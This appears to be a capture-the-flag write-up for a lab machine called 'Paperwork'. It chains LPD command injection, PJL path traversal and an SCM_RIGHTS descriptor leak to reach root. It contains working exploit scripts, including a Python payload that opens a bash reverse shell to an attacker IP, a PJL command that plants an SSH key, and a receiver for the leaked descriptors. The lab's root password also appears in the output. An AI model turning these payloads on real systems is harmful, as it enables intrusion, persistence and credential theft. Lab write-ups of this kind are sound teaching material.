Paperwork

Three custom services, three bugs: command injection in a homebrew LPD server → path traversal in a PJL printer emulator → a security daemon that leaks its own root-held file descriptor to the attacker via SCM_RIGHTS.

Attack Chain Overview

Foothold Unsanitized J field in RFC 1179 control file → shell=True injection in homebrew LPD server → shell as lp
User PJL FSUPLOAD/FSDOWNLOAD with ../ traversal in JetDirect emulator → arbitrary read/write as archivist → SSH key plant → shell
Root paperwork-daemon holds admin_pins.conf fd open as root; passes it to any connecting socket via SCM_RIGHTS on security alert → credential leak → su root

1. Reconnaissance

Initial scan shows two services. Nginx returns a 301 with no body until the correct Host header is supplied — add paperwork.htb to /etc/hosts:

nmap -sV 10.129.36.22
22/tcp open  ssh   OpenSSH 10.0p2 Ubuntu
80/tcp open  http  nginx 1.28.0 (Ubuntu)

A full port sweep turns up a third service the default top-1000 scan missed:

nmap -p- -sV -T4 10.129.36.22
22/tcp   open  ssh
80/tcp   open  http
1515/tcp open  ifor-protocol?

Nmap can't fingerprint 1515 but grabs a banner: Archive_Printer is ready and printing.

Web page

paperwork.htb serves a static "Intake Portal" for an internal document archiving system. An info table reveals the key details: protocol is RFC 1179 (Line Printer Daemon), target queue is archive_intake, and there's a download link for paperwork-archive-v1.02. RFC 1179's classic port is 515 — the service was moved to 1515, matching the mystery port.

2. Foothold: Command Injection in the LPD Server

The archive download is a zip despite lacking the extension:

file archive
# archive: Zip archive data, made by v3.0 UNIX, method=deflate

Extracting reveals server.py — the actual LPD service. The vulnerable section:

job_name = "Unknown"
for line in decoded_content.split('\n'):
    line = line.strip()
    if line.startswith('J'):
        job_name = line[1:]
        break

subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)

job_name is pulled straight from the client-supplied J line in the RFC 1179 control file with no sanitization, then dropped into an f-string executed with shell=True. A single quote breaks out of 'Archive: ...' and anything after runs as a separate shell command.

Protocol flow (reversed from the source)

  1. Send \x02 + queue name + \n to open a job against archive_intake.
  2. Send subcommand byte + "<size> <filename>\n" — size must match the exact byte length of what follows.
  3. Server acks with \x00.
  4. Send the control file content with the J line carrying the injection.
  5. Server executes the vulnerable Popen call.
#!/usr/bin/env python3
import socket

TARGET, PORT, QUEUE = "10.129.36.22", 1515, "archive_intake"
LHOST, LPORT = "10.10.14.7", 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET, PORT))
s.send(bytes([2]) + QUEUE.encode() + b"\n")

payload = f"'; bash -c \"bash -i >&/dev/tcp/{LHOST}/{LPORT} 0>&1\" ; echo '"
control_content = f"Hattacker\nProot\nJ{payload}\n".encode()

s.send(bytes([2]) + f"{len(control_content)} cfA001kali\n".encode())
s.recv(1)
s.send(control_content)
s.recv(1); s.recv(1)
s.close()

Listener catches a shell as lp.

3. Lateral Movement: PJL Path Traversal → archivist

ps aux reveals the internal landscape:

archivi+  986  ... /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ ...
lp        989  ... /usr/bin/python3 /opt/LPDServer/server.py
root      971  ... /usr/bin/python3 /root/staging/CorpoSite/app.py
root     1463  ... /usr/bin/python3 /usr/bin/paperwork-daemon

archivist is running a JetDirect printer emulator on port 9100, bound to loopback only. JetDirect almost always speaks PJL underneath, and homebrew PJL implementations have a long history of doing filesystem operations (FSUPLOAD, FSDOWNLOAD, FSDIRLIST) without sandboxing them.

Connecting to 9100 and sending @PJL INFO ID returns HP LASERJET 4ML. Listing the printer's virtual root:

@PJL FSDIRLIST NAME="0:\"
. TYPE=DIR
.. TYPE=DIR
logs TYPE=DIR SIZE=4096
jetdirect.py TYPE=FILE SIZE=5119

The service reads files as archivist, so FSUPLOAD retrieves jetdirect.py even though lp can't read /home/archivist/printer/ directly. The vulnerable path translator in the recovered source:

def _translate(self, path):
    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
    return os.path.normpath(os.path.join(self._root, clean))

0: gets stripped, backslashes become forward slashes, then joined with root and normalized — but nothing strips ../. os.path.normpath resolves printer/../user.txt straight to /home/archivist/user.txt.

Read user.txt

@PJL FSUPLOAD NAME="0:\..\user.txt"

Write SSH key for persistent access

FSDOWNLOAD uses the same _translate function plus os.makedirs(..., exist_ok=True), giving arbitrary write as archivist:

PUBKEY = b"ssh-ed25519 AAAA... cenchss@kali\n"
cmd = (b'\x1b%-12345X@PJL FSDOWNLOAD NAME="0:\\..\\.ssh\\authorized_keys" SIZE='
       + str(len(PUBKEY)).encode() + b'\r\n' + PUBKEY + b'\x1b%-12345X\r\n')
ssh -i ./archivist_key archivist@paperwork.htb

4. Privilege Escalation: SCM_RIGHTS File Descriptor Leak

No sudo, no exploitable SUID binaries, nothing in capabilities. paperwork-daemon is the only root-owned custom process left. Recovering its source:

# Opens the credential file at startup — holds the fd for the life of the process
admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)

def scan_for_malice():
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(t in content for t in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False

def trigger_lockdown(conn):
    log_fd = os.open(LOG_PATH, os.O_RDONLY)
    evidence_bundle = array.array("i", [log_fd, admin_fd])
    conn.sendmsg([b"ALERT: SECURITY_VIOLATION..."],
                 [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])

The daemon opens /etc/paperwork/admin_pins.conf as root at startup and holds the descriptor. It listens on a Unix domain socket at /run/paperwork/mgmt.sock — chmod 0660, group-owned by archivist's gid — so any connection from archivist is permitted.

The design flaw: when the printer log contains PJL filesystem commands (which it already did from the previous traversal exploit), the daemon treats this as an intrusion and sends "forensic evidence" to whoever's connected — by passing the actual open file descriptors via SCM_RIGHTS. SCM_RIGHTS duplicates the fd into the receiving process with the same access the sender had. The OS does not re-check permissions afterward. It doesn't matter who's on the other end of the socket.

The trigger condition was already satisfied. Connect and catch the passed descriptors:

import socket, array, os

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")

fds = array.array("i")
msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(2 * 4))

for level, cmsg_type, data in ancdata:
    if level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
        fds.frombytes(data[:len(data) - (len(data) % fds.itemsize)])

for fd in fds:
    print(os.pread(fd, 4096, 0).decode(errors="ignore"))

Two descriptors come back — one for the log, one for admin_pins.conf:

ADMIN_PASSWORD=ApparelMortuaryCedar22

The password doubles as root's system password:

su root

Notes

The daemon is a genuinely interesting design mistake — it's not that the monitoring logic is wrong, it's that "send the evidence to the connecting socket" and "the connecting socket might be the attacker" were never reconciled. Detecting misuse of a tool and then handing a root-held file descriptor to whoever triggered the detection is backwards; the alert channel needed to go somewhere the attacker couldn't also be listening.

The shell=True injection in the LPD server is the more familiar bug, but legacy protocols like RFC 1179 are still lying around on internal networks precisely because nobody expects them to still be running — that's what made the whole chain plausible as a "corporate intranet" scenario.
